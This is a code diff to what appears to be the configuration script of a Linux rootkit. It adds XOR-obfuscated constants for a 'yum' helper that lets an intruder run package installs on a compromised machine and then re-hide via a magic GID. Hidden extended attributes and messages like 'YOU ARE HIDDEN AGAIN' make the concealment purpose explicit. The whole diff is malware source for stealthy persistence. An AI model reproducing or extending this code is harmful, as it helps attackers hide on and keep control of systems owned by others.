@@ -229,6 +229,24 @@ def const_h_setup():
     const_h += '#define HIDDEN_XATTR_1_STR "' + xor(HIDDEN_XATTR_1_STR) + '"\n'
     const_h += '#define HIDDEN_XATTR_2_STR "' + xor(HIDDEN_XATTR_2_STR) + '"\n'
 
+    # yum, not finished yet, will complete when i can
+    const_h += '#define YUM "' + xor("yum") + '"\n'
+    const_h += '#define YUM_WARNING "' + xor("\033[1;31mTHIS FUNCTION ALLOWS YOU TO USE YUM WITHOUT DYING LOL.\nTHE YUM PROCESS WILL BE COMPLETELY VISIBLE WHILE IT IS RUNNING.\nYOU ARE POTENTIALLY RISKING YOUR OBSCURITY WHILE YOU RUN THIS COMMAND.\nYOU HAVE BEEN WARNED. PRESS ENTER TO CONTINUE. OTHERWISE, ^C TO CANCEL.\n\033[0m") + '"\n'
+    const_h += '#define YUM_USAGE "' + xor("Usage: ./yum [pw] [install/update/erase/shell] [package name]\n") + '"\n'
+    
+    const_h += '#define YUM_SUCCESS "' + xor("YUM FINISHED AND MAGIC_GID RESET. \033[1;32mYOU ARE HIDDEN AGAIN\033[0m.\n") + '"\n'
+    
+    const_h += '#define YUM_INSTALL "' + xor("install") + '"\n'
+    const_h += '#define YUM_UPDATE "' + xor("update") + '"\n'
+    const_h += '#define YUM_ERASE "' + xor("erase") + '"\n'
+    const_h += '#define YUM_SHELL "' + xor("shell") + '"\n'
+    
+    const_h += '#define YUM_INSTALL_CMD "' + xor("yum install -y %s") + '"\n'
+    const_h += '#define YUM_UPDATE_CMD "' + xor("yum update -y") + '"\n'
+    const_h += '#define YUM_ERASE_CMD "' + xor("yum erase -y %s") + '"\n'
+    const_h += '#define YUM_SHELL_CMD "' + xor("yum shell") + '"\n'
+    
+    # apt-get
     const_h += '#define APT "' + xor("apt") + '"\n'
     const_h += '#define APT_WARNING "' + xor("\033[1;31mTHIS FUNCTION ALLOWS YOU TO USE APT-GET WITHOUT FUCKING UP DPKG'S DB.\nTHE APT-GET PROCESS WILL BE COMPLETELY VISIBLE WHILE IT IS RUNNING.\nYOU ARE POTENTIALLY RISKING YOUR OBSCURITY WHILE YOU RUN THIS COMMAND.\nYOU HAVE BEEN WARNED. PRESS ENTER TO CONTINUE. OTHERWISE, ^C TO CANCEL.\n\033[0m") + '"\n'
     const_h += '#define APT_USAGE "' + xor("Usage: ./apt [pw] [update/install/remove] [package_name]\n") + '"\n'
